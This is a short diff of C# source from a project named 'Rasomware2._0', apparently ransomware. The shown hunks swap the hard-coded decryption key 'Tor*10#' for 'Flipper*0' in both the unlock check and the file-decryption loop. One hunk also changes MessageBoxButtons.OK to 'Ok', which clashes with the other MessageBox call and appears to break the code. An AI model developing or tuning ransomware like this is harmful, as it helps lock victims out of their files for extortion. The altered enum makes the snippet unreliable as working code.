@@ -164,10 +164,10 @@ namespace Rasomware2._0
         {
             if (codebox.Text == "") 
             {
-                MessageBox.Show("Incorrect key, One Attempt left", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show("Incorrect key, One Attempt left", "WRONG KEY", MessageBoxButtons.Ok, MessageBoxIcon.Error);
             }
 
-            else if(codebox.Text == "Tor*10#") 
+            else if(codebox.Text == "Flipper*0") 
             {
 
                 MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
@@ -340,7 +340,7 @@ namespace Rasomware2._0
 
             DecryptionFile dec = new DecryptionFile();
 
-            string password = "Tor*10#";
+            string password = "Flipper*0";
 
             for (int i = 0; i < files.Length; i++)
             {              
